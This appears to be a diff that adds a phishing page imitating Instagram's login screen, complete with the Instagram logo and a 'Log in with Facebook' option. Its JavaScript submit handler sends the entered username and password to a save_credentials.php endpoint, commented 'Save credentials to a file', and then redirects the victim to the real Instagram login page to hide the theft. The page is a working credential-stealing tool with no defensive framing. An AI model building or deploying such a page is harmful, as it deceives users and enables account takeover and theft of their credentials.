@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 350px;
+            text-align: center;
+        }
+
+        .logo {
+            margin: 20px auto;
+            width: 175px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            color: #fff;
+            font-weight: bold;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        button:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .divider:not(:empty)::before {
+            margin-right: 10px;
+        }
+
+        .divider:not(:empty)::after {
+            margin-left: 10px;
+        }
+
+        .login-with-fb {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 10px;
+            color: #385185;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .login-with-fb img {
+            width: 20px;
+            margin-right: 8px;
+        }
+
+        .forgot-password {
+            margin-top: 15px;
+            color: #00376b;
+            font-size: 12px;
+        }
+
+        .signup-box {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+    <script>
+        function toggleButtonState() {
+            const emailInput = document.querySelector('input[type="email"]');
+            const passwordInput = document.querySelector('input[type="password"]');
+            const loginButton = document.querySelector('button[type="submit"]');
+
+            if (emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                loginButton.disabled = false;
+            } else {
+                loginButton.disabled = true;
+            }
+        }
+
+        function handleFormSubmit(event) {
+            event.preventDefault();
+            const emailInput = document.querySelector('input[type="email"]').value;
+            const passwordInput = document.querySelector('input[type="password"]').value;
+
+            // Save credentials to a file
+            fetch('save_credentials.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ username: emailInput, password: passwordInput }),
+            })
+                .then(() => {
+                    // Redirect to Instagram's login page
+                    window.location.href = 'https://www.instagram.com/accounts/login/';
+                })
+                .catch((error) => console.error('Error saving credentials:', error));
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const emailInput = document.querySelector('input[type="email"]');
+            const passwordInput = document.querySelector('input[type="password"]');
+            const form = document.querySelector('form');
+
+            emailInput.addEventListener('input', toggleButtonState);
+            passwordInput.addEventListener('input', toggleButtonState);
+            form.addEventListener('submit', handleFormSubmit);
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
+            <form>
+                <div class="form-group">
+                    <input type="email" placeholder="Phone number, username, or email">
+                </div>
+                <div class="form-group">
+                    <input type="password" placeholder="Password">
+                </div>
+                <div class="form-group">
+                    <button type="submit" disabled>Log In</button>
+                </div>
+            </form>
+            <div class="divider">OR</div>
+            <div class="login-with-fb">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+                Log in with Facebook
+            </div>
+            <div class="forgot-password">Forgot password?</div>
+        </div>
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+</body>
+</html>
